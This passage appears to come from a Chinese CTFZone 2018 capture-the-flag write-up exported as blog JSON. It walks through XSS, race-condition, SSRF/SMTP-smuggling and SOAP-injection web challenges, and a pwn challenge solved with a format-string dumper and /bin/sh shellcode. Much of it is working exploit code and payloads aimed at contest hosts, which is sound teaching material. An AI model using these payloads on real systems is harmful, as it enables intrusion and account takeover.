$.post(\"manage.php\", {user_uuid: \"86dced2a-0305-42ed-a13c-f0c2e6079805\", token: x[1], status: \"premium\"}); \n            });\n      `);\n   </script>\n   ```\n\n   含义:\n\n   ```\n   window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=\"><svg/onload=$.globalEval(name)', <long payload>) \n   ```\n\n   将 window.name 设置为`<long payload> `。\n\n   将该html放在vps上，然后提交即可。\n\n   ![](/assets/ctfzone/TIM截图20180803213031.png)\n\n   getflag\n\n   ![](/assets/ctfzone/TIM截图20180803212919.png)\n\n6. 解法2:\n\n   payload:\n\n   ```\n   http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=\"><iframe onload=srcdoc=window.name>\n   ```\n\n   `iframe`在使用参数`srcdoc`加载的时候，会被当做同一个源。\n\n   测试，在Firefox下测试\n\n   打开Firefox,在控制台中输入:\n\n   ```\n   window.name='<script>alert(\"This is XSS!\")</scrip'+'t>';\n   ```\n\n   接下来一次在控制台中输入:\n\n   ```\n   window.location = 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E';\n   ```\n\n   发现成功弹窗户。\n\n   ![](/assets/ctfzone/TIM截图20180803214831.png)\n\n   在次输入:\n\n   ```\n   window.location = 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=window.name%3E';\n   ```\n\n   我们会发现，再不添加`srcdoc`参数的情况下，不在弹窗。\n\n   ![](/assets/ctfzone/TIM截图20180803214950.png)\n\n   getflag:\n\n   ```\n   <script>\n   window.name = `\n   <script>\n   window.frameElement.onload=null;\n   console.log(window.parent.document.body.innerHTML);\n   function elo()\n   {\n   document.getElementById('cudo').onload=null;\n   r = document.getElementById('cudo').contentWindow.document;\n   r.getElementsByName('user_uuid')[0].value = 'dbb306dd-28c1-4333-88ba-9588842f08e0';\n   r.getElementsByName('status')[0].value = 'premium';\n   r.getElementById('user_manage').submit();\n   }\n   \n   `\n   window.name += '</scrip'+'t><iframe src=\"/manage.php\" onload=\"elo()\" id=\"cudo\">';\n   window.location = 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E'\n   ```\n\n## MMORPG 3000\n\n1. 注册登录\n\n2. 在`Donate`页面获取免费武器。\n\n   ![](/assets/ctfzone/TIM截图20180803220511.png)\n\n   图片url:\n\n   ```\n   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_96c5c28becf18e71190460a9955aa4d8.png\n   ```\n\n   其中：\n\n   ![](/assets/ctfzone/TIM截图20180803220606.png)\n\n   此时，userid为860。\n\n3. 获取更多`coupon`\n\n   根据上边得到结果，我们可以测试一下 `859`\n\n   ![](/assets/ctfzone/TIM截图20180803221240.png)\n\n   得到url:\n\n   ```\n   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_537de305e941fccdbba5627e3eefbb24.png\n   ```\n\n   访问该url:\n\n   ![](/assets/ctfzone/TIM截图20180803221334.png)\n\n   得到新的`Coupon`\n\n   > f598109a-942c\n\n   ![](/assets/ctfzone/TIM截图20180803221422.png)\n\n   成功长了1分。\n\n   这时候，测试`1`.\n\n   ![](/assets/ctfzone/TIM截图20180803221713.png)\n\n   得到url:\n\n   ```\n   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_6512bd43d9caa6e02c990b0a82652dca.png\n   ```\n\n   ![](/assets/ctfzone/TIM截图20180803221807.png)\n\n   然后就可以再次得到1337分，并升级。\n\n4. 到达30级，新的问题。\n\n   ![](/assets/ctfzone/TIM截图20180803221945.png)\n\n   无法继续升级。\n\n5. 条件竞争。\n\n   这里猜测应该是条件竞争，这里猜测应该是执行数据库插入操作，高并发的情况下，导致重复插入多次。\n\n   ```\n   function levelup() {\n       balance > 10:\n       是:\n       \tlevel > 30:\n       \t是:\n       \t\texit\n       \t否:\n       \t\tlevel++                 |\n       \t\tbalance -= 10           |    在并发的情况下，没有锁的情况下，多个线程会同时进入该代码段 \n       \t\tinsert into table       | \n       否:\n       \texit\n   }\t\n   ```\n\n   并发方案1：\n\n   创建1个账号，获取足够的balance。\n\n   ```\n   import requests\n   import threading\n   \n   threadArray = []\n   \n   class expClass(threading.Thread):\n       burp0_url = \"http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one:80/donate/lvlup\"\n       burp0_cookies = {\"session\": \"eyJ1aWQiOjg2NX0.Dkaijg.3FkM2nEU3xLcIvc4DPkZxkvrjFQ\"}\n       burp0_headers = {\"User-Agent\": \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-GB,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/info\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"}\n       \n       def __init__(self, numMain):\n           super(expClass, self).__init__()\n   \n       def ham(self):\n           requests.get(self.burp0_url, headers=self.burp0_headers, cookies=self.burp0_cookies)\n   \n           \n       def run(self):\n           self.ham()\n           \n   thr = 900\n   \n   for i in range(0, thr ):\n           threadcan = expClass(i)\n           threadArray.append(threadcan)\n           \n   for i in range(0, thr):\n           threadArray[i].start()\n           print \"G thread girdi => \" + str(i)\n   for i in range(0, thr):\n           threadArray[i].join()\n           print \"R thread cikti => \" + str(i)\n   ```\n\n   并发方案2：\n\n   首先创建两个新的账号，并获取足够的balance。\n\n   race_condition.py\n\n   ```\n   import threading\n   import requests\n   from Queue import Queue\n   \n   max = 100\n   threads = Queue()\n   \n   def lvlup(cookie):\n       threads.get()\n       url = \"http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup\"\n       r = requests.get(url, cookies={\"session\": cookie})\n   \n   \n   def worker2(index):\n       lvlup(\"eyJ1aWQiOjg2MX0.DkX_wQ.Mvm0XsHQF4JnYmca6pt8z-vUkaE\")       # chrome\n   \n   \n   def worker(index):\n       lvlup(\"eyJ1aWQiOjg2Mn0.DkX_zA.egXto8_Qdii7FNhj43zKekmtYP0\")         # firefox\n   \n   \n   def race():\n       for i in range(max):\n           thread = threading.Thread(target=worker, args=[i])\n           thread.start()\n       for i in range(max):\n           thread = threading.Thread(target=worker2, args=[i])\n           thread.start()\n       for i in range(max * 2):\n           threads.put(i)\n       threads.join()\n   \n   \n   race()\n   ```\n\n   结果：\n\n   ![](/assets/ctfzone/TIM截图20180803232555.png)\n\n6. SSRF\n\n   通过条件竞争，到达31级别，出现了新的页面。\n\n   ```\n   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar\n   ```\n\n   这里存在ssrf漏洞。\n\n   ![](/assets/ctfzone/TIM截图20180803234111.png)\n\n   通过测试，可以发现过滤了`127.0.0.1`, `localhost`,可以通过`0.0.0.0`或者`127.0.0.2` bypass。\n\n   端口扫描:\n\n   示意图如下：\n\n   ![](/assets/ctfzone/TIM截图20180803234335.png)\n\n   \n\n   经过测试，发现25端口开放。\n\n   ![](/assets/ctfzone/port_scan.png)\n\n   这里存在http header注入(CRLF注入)\n\n   构造paylaod:\n\n   ```\n   Host: [0.0.0.0\n   helo 1v3m\n   mail from:<qaewjlfnwej@o3enzyme.com>\n   rcpt to:<root>\n   data\n   subject: give me flag\n   \n   1v3m\n   .\n   ]:25\n   ```\n\n   最终payload:\n\n   ```\n   [0.0.0.0%0ahelo 1v3m%0amail from:<qaewjlfnwej@o3enzyme.com>%0arcpt to:<root>%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25\n   ```\n\n7. solution1:\n\n   最终请求包:\n\n   ```\n   POST /user/avatar HTTP/1.1\n   Host: web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one\n   User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\n   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n   Accept-Language: en-GB,en;q=0.5\n   Accept-Encoding: gzip, deflate\n   Referer: http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar\n   Content-Type: multipart/form-data; boundary=---------------------------4693211868403427471435307016\n   Content-Length: 581\n   Cookie: session=eyJ1aWQiOjgyN30.DjaSgA.ylhJXkstamQ7GahYWvUypKpvDQc\n   DNT: 1\n   Connection: close\n   Upgrade-Insecure-Requests: 1\n   \n   -----------------------------4693211868403427471435307016\n   Content-Disposition: form-data; name=\"avatar\"; filename=\"\"\n   Content-Type: application/octet-stream\n   \n   \n   -----------------------------4693211868403427471435307016\n   Content-Disposition: form-data; name=\"url\"\n   \n   https://[0.0.0.0%0ahelo 1v3m%0amail from:<qaewjlfnwej@o3enzyme.com>%0arcpt to:<root>%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25\n   -----------------------------4693211868403427471435307016\n   Content-Disposition: form-data; name=\"action\"\n   \n   save\n   -----------------------------4693211868403427471435307016--\n   ```\n\n8. solution2\n\n   参考网址：https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals/web_mmorpg\n\n   ```\n   HELO 127.0.0.1\n   MAIL FROM:<A@B.c>\n   RCPT TO:<1096026150@qq.com>\n   DATA\n   From: AAA@B.C\n   To: 1096026150@qq.com\n   Subject: give me flag\n   .\n   QUIT\n   ```\n\n   payload1:\n\n   ```\n   curl 'web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar' -H 'Cookie: session=eyJ1aWQiOjg2NX0.Dkan9A.U5_9q25Izo0Y4yJq__o2oAdRAc0' --data 'url=https://127.0.0.2%0d%0aHELO 127.0.0.2%0aMAIL FROM: <A@B.C>%0aRCPT TO: <1096026150@qq.com>%0aDATA%0aFROM: AAA@B.C%0aTO: 1096026150@qq.com%0aSUBJECT: GIB%0d%0a.%0d%0a%0aQUIT%0a:25&action=save'\n   ```\n\n   注意，`url`需要使用`https`,ip地址除了`127.0.0.2`,也可以使用`0.0.0.0`。\n\n   ```\n   #define DEF_SMTPD_FORBID_CMDS    \"CONNECT GET POST\"\n   \n           /* Ignore smtpd_forbid_cmds lookup errors. Non-critical feature. */\n           if (cmdp->name == 0) {\n           state->where = SMTPD_CMD_UNKNOWN;\n           if (is_header(argv[0].strval)\n               || (*var_smtpd_forbid_cmds\n            && string_list_match(smtpd_forbid_cmds, argv[0].strval))) {\n                   msg_warn(\"non-SMTP command from %s: %.100s\",\n                        state->namaddr, vstring_str(state->buffer));\n                   smtpd_chat_reply(state, \"221 2.7.0 Error: I can break rules, too. Goodbye.\");\n                   break;\n               }\n           }\n   ```\n\n   原因:\n\n   ```\n   Our mistake was missing the special case implemented in postfix:\n   There is a hardening which targets exactly what we wanted to do - using HTTP request with injected headers to smuggle SMTP commands. The way to bypass this was to use https instead of http, because in such case the initial part of the request will actually be encrypted, and SMTP will ignore it, and the Host will be in plaintext so the server will receive nice set of SMTP commands. \n   简单来说，就是当我们使用http请求，并使用 http header注入 来注入SMTP命令的时候，会被拦截。可以使用 https， 因为 https 流量是加密过的，这样，SMTP会忽略该流量，当流量到达主机，会被解密，这时候SMTP就会收到一组漂亮的 SMTP 命令。\n   ```\n\n   结果:\n\n   ![](/assets/ctfzone/TIM截图20180803235132.png)\n\n# PWN\n\n## easypwn_strings\n\ndump.py:\n\n```\nfrom pwn import *\n\ndef conn():\n    return remote('pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one', 1234)\n\ndef dump(adr,frmt='p'):\n    r.recvuntil('StrRemoveLastSymbols')\n    r.recvuntil('\\n')\n    r.sendline('3')\n    r.recvuntil(':')\n    r.recvuntil('\\n')\n\n    leak_part = \"|%19${}|\".format(frmt)\n    out = leak_part.ljust(4*10,\"A\")+\"EOF_\"+p32(adr)\n    r.sendline(out)\n    r.sendline('0')\n    r.recvuntil('Result:')\n    return r.recvuntil(\"|A\")[:-2].split(\"|\")[1]\n\nstart_addr = 0x8048750\n\nwhile True:\n    try:\n        fd = open(\"dumped_file\",\"a\")\n        r = conn()\n        data = dump(start_addr,'s')\n        print \"|0x%08x|%s|\" % (start_addr,data)\n        if data == \"(null)\" or data == \"\":\n            fd.write(\"\\x00\")\n            start_addr += 1\n        else:\n            fd.write(data+\"\\x00\")\n            start_addr += len(data)+1\n        fd.close()\n        r.close()\n    except Exception as e:\n        print e\n        print \"[!] execption\"\n        break\n```\n\npayload.py:\n\n```\n#!/usr/bin/env python2\nfrom pwn import *\ndef recvlines(lnum):\n    global p\n    res=\"\"\n    for x in range(lnum):\n        res+=p.recvline()\n    return res\n \nhost=\"pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one\"\nport=1234\n \nbase_buf=0x80492e0\nshellcode=\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"\npayload=(\"y\"+shellcode).ljust(256,\"\\x90\")+p32(base_buf+1)\np=remote(host,port)\n#p=process(\"./babypwn\")\nprint recvlines(4)\np.sendline(\"X\")\nprint recvlines(3)\np.sendline(payload)\np.interactive()\n```\n\n","slug":"ctfzone-ctf","published":1,"updated":"2018-08-06T12:15:31.872Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12gx000bqkdl7mffgbm7","content":"<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"Piggy-Bank\"><a href=\"#Piggy-Bank\" class=\"headerlink\" title=\"Piggy Bank\"></a>Piggy Bank</h2><ol>\n<li><p>根据注释找到<em><a href=\"http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php\" target=\"_blank\" rel=\"noopener\">http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php</a></em></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">wsdl:definitions</span> <span class=\"attr\">xmlns:tns</span>=<span class=\"string\">\"urn:Bank\"</span> <span class=\"attr\">xmlns:soap</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/wsdl/soap/\"</span> <span class=\"attr\">xmlns:xsd</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema\"</span> <span class=\"attr\">xmlns:soapenc</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/encoding/\"</span> <span class=\"attr\">xmlns:wsdl</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/wsdl/\"</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/wsdl/\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"Bank\"</span> <span class=\"attr\">targetNamespace</span>=<span class=\"string\">\"urn:Bank\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BalanceRequest\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"wallet_num\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:decimal\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BalanceResponse\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"code\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:float\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"status\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:string\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span> <span class=\"attr\">name</span>=<span class=\"string\">\"internalTransferRequest\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"receiver_wallet_num\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:decimal\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"sender_wallet_num\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:decimal\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"amount\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:float\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"token\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:string\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span> <span class=\"attr\">name</span>=<span class=\"string\">\"internalTransferResponse\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"code\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:float\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"status\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:string\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">portType</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BankServicePort\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">operation</span> <span class=\"attr\">name</span>=<span class=\"string\">\"requestBalance\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">message</span>=<span class=\"string\">\"tns:BalanceRequest\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">output</span> <span class=\"attr\">message</span>=<span class=\"string\">\"tns:BalanceResponse\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">operation</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">operation</span> <span class=\"attr\">name</span>=<span class=\"string\">\"internalTransfer\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">message</span>=<span class=\"string\">\"tns:internalTransferRequest\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">output</span> <span class=\"attr\">message</span>=<span class=\"string\">\"tns:internalTransferResponse\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">operation</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">portType</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">binding</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BankServiceBinding\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"tns:BankServicePort\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:binding</span> <span class=\"attr\">style</span>=<span class=\"string\">\"rpc\"</span> <span class=\"attr\">transport</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/http\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">operation</span> <span class=\"attr\">name</span>=<span class=\"string\">\"requestBalance\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:operation</span> <span class=\"attr\">soapAction</span>=<span class=\"string\">\"urn:requestBalanceAction\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:body</span> <span class=\"attr\">use</span>=<span class=\"string\">\"encoded\"</span> <span class=\"attr\">namespace</span>=<span class=\"string\">\"urn:Bank\"</span> <span class=\"attr\">encodingStyle</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/encoding/\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">input</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">output</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:body</span> <span class=\"attr\">use</span>=<span class=\"string\">\"encoded\"</span> <span class=\"attr\">namespace</span>=<span class=\"string\">\"urn:Bank\"</span> <span class=\"attr\">encodingStyle</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/encoding/\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">output</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">operation</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">operation</span> <span class=\"attr\">name</span>=<span class=\"string\">\"internalTransfer\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:operation</span> <span class=\"attr\">soapAction</span>=<span class=\"string\">\"urn:internalTransferAction\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:body</span> <span class=\"attr\">use</span>=<span class=\"string\">\"encoded\"</span> <span class=\"attr\">namespace</span>=<span class=\"string\">\"urn:Bank\"</span> <span class=\"attr\">encodingStyle</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/encoding/\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">input</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">output</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:body</span> <span class=\"attr\">use</span>=<span class=\"string\">\"encoded\"</span> <span class=\"attr\">namespace</span>=<span class=\"string\">\"urn:Bank\"</span> <span class=\"attr\">encodingStyle</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/encoding/\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">output</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">operation</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">binding</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">wsdl:service</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BankService\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">wsdl:port</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BankServicePort\"</span> <span class=\"attr\">binding</span>=<span class=\"string\">\"tns:BankServiceBinding\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:address</span> <span class=\"attr\">location</span>=<span class=\"string\">\"http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">wsdl:port</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">wsdl:service</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">wsdl:definitions</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>包含两个API</p>\n<ul>\n<li><strong>Request Balance</strong> allows us to see the balance of any account id we want.</li>\n<li><strong>Internal Transfer</strong> transfers some amount from account <em>sender</em> to account <em>receiver</em>.</li>\n</ul>\n</li>\n<li><p>解法1：XML/soap注入</p>\n<p>internalTransfer请求：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver_wallet_num</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:decimal\"</span>&gt;</span> [DATA FROM FORM INPUT] <span class=\"tag\">&lt;/<span class=\"name\">receiver_wallet_num</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">sender_wallet_num</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:decimal\"</span>&gt;</span> [LOGGED IN USER ID] <span class=\"tag\">&lt;/<span class=\"name\">sender_wallet_num</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">amount</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:float\"</span>&gt;</span> [DATA FROM FORM INPUT] <span class=\"tag\">&lt;/<span class=\"name\">amount</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">token</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:string\"</span>&gt;</span> [SECRET SERVER TOKEN] <span class=\"tag\">&lt;/<span class=\"name\">token</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>传递参数Receiver:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(Our ID) &lt;/receiver_wallet_num&gt;</span><br><span class=\"line\">&lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;(Any ID)&lt;/sender_wallet_num&gt;&lt;!--</span><br></pre></td></tr></table></figure>\n<p>传递参数Amount:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--&gt;&lt;amount xsi:type=&quot;xsd:float&quot;&gt; (Amount)</span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver_wallet_num</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:decimal\"</span>&gt;</span> (Our ID) <span class=\"tag\">&lt;/<span class=\"name\">receiver_wallet_num</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">sender_wallet_num</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:decimal\"</span>&gt;</span>(Any ID)<span class=\"tag\">&lt;/<span class=\"name\">sender_wallet_num</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- &lt;/receiver_wallet_num&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;sender_wallet_num xsi:type=\"xsd:decimal\"&gt; [LOGGED IN USER ID] &lt;/sender_wallet_num&gt;</span></span><br><span class=\"line\"><span 